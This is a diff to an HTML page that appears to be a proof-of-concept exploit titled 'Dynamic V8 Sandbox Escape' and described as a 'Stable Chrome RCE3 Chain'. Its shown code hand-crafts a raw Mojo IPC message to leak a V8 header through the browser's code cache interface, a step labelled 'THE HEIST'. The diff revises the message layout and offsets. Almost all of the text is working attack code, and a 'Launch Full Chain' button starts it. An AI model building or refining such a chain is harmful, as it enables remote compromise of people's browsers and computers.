@@ -4,7 +4,7 @@
     <title>Dynamic V8 Sandbox Escape - Remote PoC</title>
 </head>
 <body>
-    <h1>Stable Chrome RCE2 Chain</h1>
+    <h1>Stable Chrome RCE3 Chain</h1>
     <p>Status: <b id="status">Ready</b></p>
     <button id="launch">Launch Full Chain</button>
 
@@ -38,40 +38,38 @@
             // 3. THE HEIST: Request the legit header from the Browser
             status.innerText = "Step 2: Leaking V8 Header via Mojo...";
             
-            // INCREASED to 144 to comfortably fit the 32-byte header + 24-byte Params + 16-byte GURL + 56-byte String
-            const fetchMsg = new ArrayBuffer(144); 
+            const fetchMsg = new ArrayBuffer(128); 
             const fv = new DataView(fetchMsg);
             
-            // Mojo Request Header (32 bytes)
-            fv.setUint32(0, 32, true);  // Header Size (32 for requests)
-            fv.setUint32(4, 1, true);   // Header Version (1)
+            // Mojo Request Header (Starts at 0)
+            fv.setUint32(0, 32, true);  // Header Size
+            fv.setUint32(4, 1, true);   // Header Version
             fv.setUint32(8, 0, true);   // Interface ID
-            fv.setUint32(12, 3, true);  // Message ID: FetchCachedCode (3)
-            fv.setUint32(16, 1, true);  // Flags: kMessageExpectsResponse (1)
+            fv.setUint32(12, 3, true);  // Message ID: FetchCachedCode
+            fv.setUint32(16, 1, true);  // Flags: kMessageExpectsResponse
             fv.setUint32(20, 0, true);  // Padding
-            fv.setBigUint64(24, 1n, true); // Request ID: 1 
+            fv.setBigUint64(24, 1n, true); // Request ID
 
-            // Params Struct (starts at offset 32)
+            // Params Struct (Starts at 32)
             fv.setUint32(32, 24, true); // Struct size
             fv.setUint32(36, 0, true);  // Struct version
-            fv.setUint32(40, 0, true);  // CodeCacheType kJavascript (0)
+            fv.setUint32(40, 0, true);  // CodeCacheType kJavascript
             fv.setUint32(44, 0, true);  // Padding
-            fv.setBigUint64(48, 8n, true); // Offset to GURL struct (points to 64)
+            fv.setBigUint64(48, 8n, true); // Pointer to GURL struct (48 + 8 = 56)
 
-            // GURL Struct (starts at offset 64)
-            fv.setUint32(64, 16, true); // Struct size
-            fv.setUint32(68, 0, true);  // Struct version
-            fv.setBigUint64(72, 8n, true); // Offset to String Array (points to 88)
+            // GURL Struct (Starts at 56)
+            fv.setUint32(56, 16, true); // Struct size
+            fv.setUint32(60, 0, true);  // Struct version
+            fv.setBigUint64(64, 8n, true); // Pointer to String Array (64 + 8 = 72)
 
-            // String Array Struct (starts at offset 88)
-            // Header is 8 bytes. Target URL is 43 characters.
-            // 8 + 43 = 51. Aligned to nearest 8-byte boundary = 56.
-            fv.setUint32(88, 56, true); // Array struct size
-            fv.setUint32(92, TARGET_URL.length, true); // Num elements
+            // String Array Struct (Starts at 72)
+            // 8 byte array header + 43 char string = 51. Aligned to 8 bytes = 56.
+            fv.setUint32(72, 56, true); // Array struct size
+            fv.setUint32(76, TARGET_URL.length, true); // Num elements
             for(let i=0; i<TARGET_URL.length; i++) {
-                fv.setUint8(96+i, TARGET_URL.charCodeAt(i));
+                fv.setUint8(80+i, TARGET_URL.charCodeAt(i)); // String starts at 80
             }
-            // End of string is at offset 139. 
+            // String ends safely at byte 123.
             
             host.writeMessage(fetchMsg, []);
 
